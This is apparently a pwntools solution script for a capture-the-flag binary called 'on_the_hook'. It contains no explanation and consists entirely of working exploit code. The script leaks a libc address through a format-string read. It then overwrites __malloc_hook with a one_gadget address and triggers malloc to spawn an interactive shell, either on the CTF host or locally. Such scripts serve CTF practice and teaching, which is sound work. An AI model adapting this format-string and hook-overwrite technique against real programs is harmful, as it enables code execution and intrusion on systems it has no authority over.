#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./on_the_hook')

if args.REMOTE:
	p = remote('ctf.k3rn3l4rmy.com', 2201)
	libc = ELF('./libc.so.6')
	__libc_start_main_offset = 247
	libc.symbols['gadget'] = [0x3ac5c,0x3ac5e,0x3ac62,0x3ac69,0x5fbc5,0x5fbc6][2]
else:
	p = process(binary.path)
	libc = ELF('/lib/i386-linux-gnu/libc.so.6')
	__libc_start_main_offset = 245
	libc.symbols['gadget'] = [0xcdc4b,0x1487fb,0x1487fc][2]

offset = 7

p.sendlineafter(b':\n',b'%27$010p')
libc.address = int(p.recvline().strip(),16) - libc.sym.__libc_start_main - __libc_start_main_offset
log.info('libc.address: {x}'.format(x = hex(libc.address)))

payload = fmtstr_payload(offset,{libc.sym.__malloc_hook:libc.sym.gadget},write_size='short')
assert(len(payload) < 0x40)
assert(payload.find(b'\n') == -1)

p.sendline(payload)
p.recvuntil(b'\n')
p.sendline(b'%65536c')
p.interactive()
